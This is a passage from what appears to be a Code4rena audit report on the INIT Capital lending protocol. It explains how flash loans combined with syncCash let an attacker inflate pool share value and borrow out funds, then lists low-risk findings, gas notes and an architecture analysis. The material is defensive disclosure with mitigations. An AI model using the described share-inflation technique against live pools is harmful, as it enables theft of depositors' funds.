class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">_pools</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">i</span><span class=\"mtk1\">.</span><span class=\"mtk11\">uinc</span><span class=\"mtk1\">()) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">poolCash</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">ILendingPool</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_pools</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">]).</span><span class=\"mtk11\">syncCash</span><span class=\"mtk1\">();</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-12-initcapital/blob/a53e401529451b208095b3af11862984d0b32177/contracts/lending_pool/LendingPool.sol#L148\">Sync cash is called</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"33\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   </span><span class=\"mtk3\">/// @inheritdoc ILendingPool</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">syncCash</span><span class=\"mtk1\">() </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">accrue</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyCore</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">newCash</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">newCash</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">IERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">underlyingToken</span><span class=\"mtk1\">).</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">_require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">newCash</span><span class=\"mtk1\"> &gt;= </span><span class=\"mtk12\">cash</span><span class=\"mtk1\">, </span><span class=\"mtk12\">Errors</span><span class=\"mtk1\">.</span><span class=\"mtk12\">INVALID_AMOUNT_TO_REPAY</span><span class=\"mtk1\">); </span><span class=\"mtk3\">// flash not repay</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">cash</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">newCash</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p>Basically by using the flash function and then trigger syncCash, user can always donate the token to the pool to inflate share worth.</p>\n<p>Then in the collateral credit calculation, we are <a href=\"https://github.com/code-423n4/2023-12-initcapital/blob/a53e401529451b208095b3af11862984d0b32177/contracts/core/InitCore.sol#L462\">converting shares worth to amount worth</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"34\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tokenValue_e36</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">ILendingPool</span><span class=\"mtk1\">(</span><span class=\"mtk12\">pools</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">]).</span><span class=\"mtk11\">toAmtCurrent</span><span class=\"mtk1\">(</span><span class=\"mtk12\">shares</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">]) * </span><span class=\"mtk12\">tokenPrice_e36</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p>Which calls the function <a href=\"https://github.com/code-423n4/2023-12-initcapital/blob/a53e401529451b208095b3af11862984d0b32177/contracts/lending_pool/LendingPool.sol#L266\">toAmt</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"35\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_toAmt</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_shares</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_totalAssets</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_totalShares</span><span class=\"mtk1\">) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">pure</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amt</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_shares</span><span class=\"mtk1\">.</span><span class=\"mtk11\">mulDiv</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_totalAssets</span><span class=\"mtk1\"> + </span><span class=\"mtk12\">VIRTUAL_ASSETS</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_totalShares</span><span class=\"mtk1\"> + </span><span class=\"mtk12\">VIRTUAL_SHARES</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>Assume shares do not change.<br>\nAssume total shares does not change.</p>\n<p>Clearly inflating the total asset (which is _cash + debt) inflates share worth.</p>\n<p>Again, in the case of infinite token minting, hacker can donate the token to the lending pool to inflate the collateral credit and borrow all fund out and create large bad debt.</p>\n<h3 id=\"recommended-mitigation-steps-14\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-14\" aria-label=\"recommended mitigation steps 14 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Use internal balance to track the cash amount and do not allow user to indirectly access the sync cash function via flash loan.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-12-initcapital-findings/issues/3#issuecomment-1869762110\">fez-init (INIT) confirmed</a></strong></p>\n<hr>\n<h1 id=\"low-risk-and-non-critical-issues\" style=\"position:relative;\"><a href=\"#low-risk-and-non-critical-issues\" aria-label=\"low risk and non critical issues permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Low Risk and Non-Critical Issues</h1>\n<p>For this audit, 3 reports were submitted by wardens detailing low risk and non-critical issues. The <a href=\"https://github.com/code-423n4/2023-12-initcapital-findings/issues/35\">report highlighted below</a> by <strong>0x73696d616f</strong> received the top score from the judge.</p>\n<p><em>The following wardens also submitted reports: <a href=\"https://github.com/code-423n4/2023-12-initcapital-findings/issues/46\">sashik_eth</a> and <a href=\"https://github.com/code-423n4/2023-12-initcapital-findings/issues/8\">ladboy233</a>.</em></p>\n<h2 id=\"l-01-reservefactor-in-lendingpool-should-be-capped-at-1e18\" style=\"position:relative;\"><a href=\"#l-01-reservefactor-in-lendingpool-should-be-capped-at-1e18\" aria-label=\"l 01 reservefactor in lendingpool should be capped at 1e18 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[L-01] reserveFactor in LendingPool should be capped at 1e18</h2>\n<p><a href=\"https://github.com/code-423n4/2023-12-initcapital/blob/main/contracts/lending_pool/LendingPool.sol#L239-L241\"><code>setReserveFactor()_e18</code></a> does not check the reserveFactor, which if bigger than <code>1e18</code>, will make <a href=\"https://github.com/code-423n4/2023-12-initcapital/blob/main/contracts/lending_pool/LendingPool.sol#L155\"><code>accrueInterest()</code></a> always underflow, DoSing the lending pool functions that depend on the <a href=\"https://github.com/code-423n4/2023-12-initcapital/blob/main/contracts/lending_pool/LendingPool.sol#L55\"><code>accrue()</code></a> modifier. It should ideally be capped at a lower value, but this is more of a centralization risk.</p>\n<h2 id=\"l-02-setborrfactors_e18-could-check-for-duplicate-_pools-as-an-additional-check-to-make-sure-that-no-incorrect-factors-are-set\" style=\"position:relative;\"><a href=\"#l-02-setborrfactors_e18-could-check-for-duplicate-_pools-as-an-additional-check-to-make-sure-that-no-incorrect-factors-are-set\" aria-label=\"l 02 setborrfactors_e18 could check for duplicate _pools as an additional check to make sure that no incorrect factors are set permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[L-02] <code>setBorrFactors_e18()</code> could check for duplicate <code>_pools</code> as an additional check to make sure that no incorrect factors are set</h2>\n<p>If 2 duplicates are sent, only the latter will take effect, which could have very dangerous implications.</p>\n<h2 id=\"l-03-excess-eth-in-initcoremulticall-and-initcorecallback-could-be-refunded\" style=\"position:relative;\"><a href=\"#l-03-excess-eth-in-initcoremulticall-and-initcorecallback-could-be-refunded\" aria-label=\"l 03 excess eth in initcoremulticall and initcorecallback could be refunded permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[L-03] excess ETH in <a href=\"https://github.com/code-423n4/2023-12-initcapital/blob/main/contracts/core/InitCore.sol#L389\"><code>InitCore:Multicall()</code></a> and <a href=\"https://github.com/code-423n4/2023-12-initcapital/blob/main/contracts/core/InitCore.sol#L505\"><code>InitCore:callback()</code></a> could be refunded</h2>\n<h2 id=\"n-01--execute-could-check-leftover-balances-in-all-interacted-tokens\" style=\"position:relative;\"><a href=\"#n-01--execute-could-check-leftover-balances-in-all-interacted-tokens\" aria-label=\"n 01  execute could check leftover balances in all interacted tokens permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[N-01]  <a href=\"https://github.com/code-423n4/2023-12-initcapital/blob/main/contracts/hook/MoneyMarketHook.sol#L53\"><code>execute()</code></a> could check leftover balances in all interacted tokens</h2>\n<p>Users could make mistakes and tokens beside <code>ETH</code> could be left in the contract. The refund mechanism could be extended to other tokens as well.</p>\n<h2 id=\"n-02-missing-a-way-to-remove-colltokens-from-configsol-which-could-be-dangerous-in-the-long-run-as-some-token-could-go-rogue-or-an-upgrade\" style=\"position:relative;\"><a href=\"#n-02-missing-a-way-to-remove-colltokens-from-configsol-which-could-be-dangerous-in-the-long-run-as-some-token-could-go-rogue-or-an-upgrade\" aria-label=\"n 02 missing a way to remove colltokens from configsol which could be dangerous in the long run as some token could go rogue or an upgrade permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[N-02] missing a way to remove <code>collTokens</code> from <code>Config.sol</code>, which could be dangerous in the long run as some token could go rogue (or an upgrade).</h2>\n<p><strong><a href=\"https://github.com/code-423n4/2023-12-initcapital-findings/issues/35#issuecomment-1870331709\">fez-init (INIT) acknowledged</a></strong></p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-12-initcapital-findings/issues/35#issuecomment-1872449403\">hansfriese (Judge) commented</a>:</strong></p>\n<blockquote>\n<p>These 3 submissions were downgraded to low/non-critical and also considered in warden 0x73696d616f’s score:</p>\n<ul>\n<li><a href=\"https://github.com/code-423n4/2023-12-initcapital-findings/issues/45\">RebaseHelperParams.rebaseHelperParams.helper is not whitelisted, which could lead to user mistakes or phishing attacks</a></li>\n<li><a href=\"https://github.com/code-423n4/2023-12-initcapital-findings/issues/44\">Possible price manipulation in InitOracle due to lack of checks</a></li>\n<li><a href=\"https://github.com/code-423n4/2023-12-initcapital-findings/issues/43\">Liquidations can possibly be prevented if a liquidate call frontruns another one with a partial liquidation</a></li>\n</ul>\n</blockquote>\n<hr>\n<h1 id=\"gas-optimizations\" style=\"position:relative;\"><a href=\"#gas-optimizations\" aria-label=\"gas optimizations permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Gas Optimizations</h1>\n<p>For this audit, 2 reports were submitted by wardens detailing gas optimizations. The <a href=\"https://github.com/code-423n4/2023-12-initcapital-findings/issues/23\">report highlighted below</a> by <strong>rvierdiiev</strong> received the top score from the judge.</p>\n<p><em>The following wardens also submitted reports: <a href=\"https://github.com/code-423n4/2023-12-initcapital-findings/issues/34\">0x73696d616f</a>.</em></p>\n<h2 id=\"g-01-setposmode-function-loops-through-all-borrowed-pools-and-checks-if-it-is-allowed-to-borrow-in-new-mode-and-repay-in-old-pool-inside-the-loop\" style=\"position:relative;\"><a href=\"#g-01-setposmode-function-loops-through-all-borrowed-pools-and-checks-if-it-is-allowed-to-borrow-in-new-mode-and-repay-in-old-pool-inside-the-loop\" aria-label=\"g 01 setposmode function loops through all borrowed pools and checks if it is allowed to borrow in new mode and repay in old pool inside the loop permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-01] <code>setPosMode</code> function loops through all borrowed pools and checks <a href=\"https://github.com/code-423n4/2023-12-initcapital/blob/main/contracts/core/InitCore.sol#L203-L204\">if it is allowed to borrow in new mode and repay in old pool</a> inside the loop</h2>\n<p>It’s possible to do that only 1 time outside the loop in case if pools length is not 0. This will save gas and will reduce those 2 lines calculation for n times to 1.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-12-initcapital-findings/issues/23#issuecomment-1870309323\">fez-init (INIT) confirmed</a></strong></p>\n<hr>\n<h1 id=\"audit-analysis\" style=\"position:relative;\"><a href=\"#audit-analysis\" aria-label=\"audit analysis permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Audit Analysis</h1>\n<p>An analysis report examines the codebase as a whole, providing observations and advice on such topics as architecture, mechanism, or approach. The <a href=\"https://github.com/code-423n4/2023-12-initcapital-findings/issues/7\">report highlighted below</a> by <strong>ladboy233</strong> received the top score from the judge.</p>\n<h3 id=\"overview-1\" style=\"position:relative;\"><a href=\"#overview-1\" aria-label=\"overview 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Overview</h3>\n<p>The INIT project introduces a comprehensive framework designed to revolutionize the way users interact with digital assets and lending markets. Key features of the project include a multi-silo position system, innovative use of flashloans, multicall capabilities, LP tokens as collateral, and a dynamic interest rate model.</p>\n<h3 id=\"key-components-and-features\" style=\"position:relative;\"><a href=\"#key-components-and-features\" aria-label=\"key components and features permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Key Components and Features</h3>\n<ol>\n<li><strong>Multi-Silo Positioning</strong>: This unique feature allows individual wallet addresses to manage multiple, isolated positions, each identified by a separate position id. This structure enhances flexibility and control for users.</li>\n<li><strong>Flashloan Integration</strong>: Flashloans are integrated into the system, providing users with advanced financial tools for various trading and arbitrage strategies.</li>\n<li><strong>Multicall Functionality</strong>: Users can execute a batched sequence of actions through multicall, enabling complex transactions like borrowing first and collateralizing later, simplifying the transaction process.</li>\n<li><strong>LP Tokens and Collateral</strong>: The system allows for the use of LP tokens as collateral by employing wrapped LPs, broadening the scope of usable assets within the platform.</li>\n<li><strong>Interest Rate Model</strong>: A sophisticated model is in place to manage interest rates, contributing to a balanced and fair lending environment.</li>\n</ol>\n<h3 id=\"core-components\" style=\"position:relative;\"><a href=\"#core-components\" aria-label=\"core components permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Core Components</h3>\n<ul>\n<li><strong>InitCore</strong>: The central interface for user interactions. It includes essential actions like minting and burning tokens, collateralization, borrowing, and repaying loans. The multicall feature allows for batching of these actions for efficiency.</li>\n<li><strong>LendingPool</strong>: Manages the supply of tokens and the total debt share, playing a pivotal role in the liquidity of the system.</li>\n<li><strong>PosManager</strong>: Responsible for managing individual positions, including debt shares and collaterals.</li>\n<li><strong>LiqIncentiveCalculator</strong>: This component calculates liquidation incentives, primarily based on the health of a position.</li>\n<li><strong>MoneyMarketHook</strong>: Implements standard money market actions like deposit, withdrawal, borrowing, and repayment.</li>\n<li><strong>InitOracle</strong>: Aggregates oracle prices from primary and secondary sources for accurate asset valuation.</li>\n<li><strong>RiskManager</strong>: Addresses potential risks in the money market, particularly focusing on issues like price impact from concentrated collateralization. The implementation of a debt ceiling per mode is a notable risk mitigation measure.</li>\n</ul>\n<h3 id=\"pending-integrations-and-future-developments\" style=\"position:relative;\"><a href=\"#pending-integrations-and-future-developments\" aria-label=\"pending integrations and future developments permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Pending Integrations and Future Developments</h3>\n<ul>\n<li><strong>WLp Contract</strong>: Although not currently in scope, this wrapped LP contract is anticipated to integrate with certain DEXs and handle reward calculations, signifying a future expansion of the platform’s capabilities.</li>\n</ul>\n<h3 id=\"summary-of-centralization-dependency-and-configuration-risks-in-the-init-protocol\" style=\"position:relative;\"><a href=\"#summary-of-centralization-dependency-and-configuration-risks-in-the-init-protocol\" aria-label=\"summary of centralization dependency and configuration risks in the init protocol permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Summary of Centralization Dependency and Configuration Risks in the INIT Protocol</h3>\n<p><strong>Centralization Risks</strong></p>\n<ol>\n<li><strong>Config.sol</strong>: The administrative authority in <code>Config.sol</code> carries a significant centralization risk. The admin has the power to modify protocol configurations without any limitations. This includes changing collateral and borrow factors at will, potentially triggering unintended liquidations for users. Furthermore, the admin can alter the mode status, directly impacting users’ ability to engage in key functions like collateralizing and borrowing.</li>\n<li><strong>IncentiveCalculator.sol</strong>: In the <code>IncentiveCalculator.sol</code> component, unrestricted administrative control also poses centralization risks. The admin can adjust the maxIncentiveMultiplier arbitrarily. Excessive maxIncentiveMultipliers could lead to disproportionate losses for users undergoing liquidation.</li>\n<li><strong>InitCore.sol</strong>: The <code>InitCore.sol</code> also suffers from centralization issues due to unrestricted admin access. The admin can change critical configurations, such as the config address, potentially leading to configurations that compromise user security and interests.</li>\n<li><strong>LendingPool.sol</strong>: Similar centralization risks exist in <code>LendingPool.sol</code>, where the admin can arbitrarily alter the reserveFactor. Such changes can lead to an uneven distribution of interests, favoring the treasury disproportionately.</li>\n<li><strong>Oracle Components (Api3OracleReader.sol/PythOracleReader.sol/InitOracle.sol)</strong>: In these components, the admin can modify oracle addresses without restrictions, introducing centralization risks. Inaccurate oracle addresses can lead to incorrect price reporting, potentially draining the liquidity of the lending pool.</li>\n</ol>\n<p><strong>Systemic 